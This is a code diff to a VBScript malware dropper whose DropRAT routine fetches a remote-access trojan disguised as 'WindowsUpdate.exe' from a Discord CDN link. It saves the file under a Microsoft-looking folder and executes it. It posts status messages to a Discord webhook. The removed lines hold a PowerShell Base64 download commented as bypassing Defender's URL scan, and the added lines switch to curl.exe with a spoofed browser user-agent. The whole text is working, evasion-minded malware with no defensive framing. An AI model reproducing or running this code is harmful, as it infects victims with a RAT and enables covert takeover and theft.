@@ -43,10 +43,10 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Base64 Download + Disk Execution) ---
+' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Updated RAT Link
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572769326296072292/PcCheck.exe?ex=6aff9314&is=6afe4194&hm=3a8565741dfddd0f398c3e82a5af415199025c984eba4c7435398ffd03ffc978&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572780865300201522/WindowsUpdate.exe?ex=6aff9dd3&is=6afe4c53&hm=69e17f8d49f71c492d9a30651f54d75e4c63c43dea23110cef0e5435923ceee4&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -54,24 +54,21 @@ Sub DropRAT(targetWH, sendRocket)
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
 
-    ' 1. Send the Rocket Download message
-    If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading and launching RAT", 10181046, targetWH)
-
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' 2. Download as Base64 and write to disk (Bypasses Defender's URL scan)
-    Dim psCmd : psCmd = "powershell -NoP -Exec Bypass -Command """ & _
-        "$wc = New-Object System.Net.WebClient;" & _
-        "$b64 = $wc.DownloadString('" & dl & "');" & _
-        "[IO.File]::WriteAllBytes('" & op & "', [Convert]::FromBase64String($b64));" & _
-        """"
-    
-    sh.Run psCmd, 0, True
+    ' 1. Download file via curl.exe
+    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
+    sh.Run dlCmd, 0, True
 
-    ' 3. Check file and Execute
+    ' 2. Check file, calculate MB, send Rocket message
     If fso.FileExists(op) Then
-        If fso.GetFile(op).Size > 100000 Then
-            ' Execute the file via WMI (Bypasses standard hooks)
+        Dim fSize : fSize = fso.GetFile(op).Size
+        If fSize > 100000 Then
+            Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
+            
+            If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
+
+            ' 3. Execute the file via WMI
             Call RunCmd("""" & op & """")
             
             ' 4. Send the Green Checkmark
@@ -80,6 +77,8 @@ Sub DropRAT(targetWH, sendRocket)
                 Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
             End If
         End If
+    Else
+        If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Failed to fetch payload.", 10181046, targetWH)
     End If
 End Sub
 
